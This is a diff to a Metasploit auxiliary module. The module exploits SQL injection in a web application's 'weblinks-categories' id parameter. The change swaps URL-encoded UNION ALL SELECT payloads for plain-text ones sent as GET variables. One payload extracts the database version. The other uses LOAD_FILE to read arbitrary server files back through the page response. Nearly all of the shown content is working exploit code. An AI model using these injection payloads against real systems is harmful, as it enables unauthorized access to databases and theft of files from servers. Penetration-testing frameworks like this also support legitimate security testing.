@@ -47,12 +47,15 @@ class Metasploit3 < Msf::Auxiliary
     back_marker = Rex::Text.rand_text_alpha(6)
 
     payload = datastore['CATEGORYID'].to_s
-    payload << "%29%20UNION%20ALL%20SELECT%20CONCAT%280x#{front_marker.unpack('H*')[0]}%2C"
-    payload << "IFNULL%28CAST%28VERSION%28%29%20"
-    payload << "AS%20CHAR%29%2C0x20%29%2C0x#{back_marker.unpack('H*')[0]}%29%23"
+    payload << ") UNION ALL SELECT CONCAT(0x#{front_marker.unpack('H*')[0]},"
+    payload << "IFNULL(CAST(VERSION() "
+    payload << "AS CHAR),0x20),0x#{back_marker.unpack('H*')[0]})#"
 
     resp = send_request_cgi({
-      'uri' => normalize_uri(target_uri.path, 'index.php', 'weblinks-categories?id=' + payload)
+      'uri' => normalize_uri(target_uri.path, 'index.php', 'weblinks-categories'),
+      'vars_get' => {
+        'id' => payload
+      }
     })
 
     if !resp or !resp.body
@@ -77,12 +80,15 @@ class Metasploit3 < Msf::Auxiliary
     catid = datastore['CATEGORYID']
 
     payload = catid.to_s 
-    payload << "%29%20UNION%20ALL%20SELECT%20CONCAT%280x#{front_marker.unpack('H*')[0]}"
-    payload << "%2CIFNULL%28CAST%28HEX%28LOAD_FILE%28"
-    payload << "0x#{file}%29%29%20AS%20CHAR%29%2C0x20%29%2C0x#{back_marker.unpack('H*')[0]}%29%23"
+    payload << ") UNION ALL SELECT CONCAT(0x#{front_marker.unpack('H*')[0]}"
+    payload << ",IFNULL(CAST(HEX(LOAD_FILE("
+    payload << "0x#{file})) AS CHAR),0x20),0x#{back_marker.unpack('H*')[0]})#"
 
     resp = send_request_cgi({
-      'uri' => normalize_uri(target_uri.path, 'index.php', 'weblinks-categories?id=' + payload)
+      'uri' => normalize_uri(target_uri.path, 'index.php', 'weblinks-categories'),
+      'vars_get' => {
+        'id' => payload
+      }
     })
 
     if !resp or !resp.body
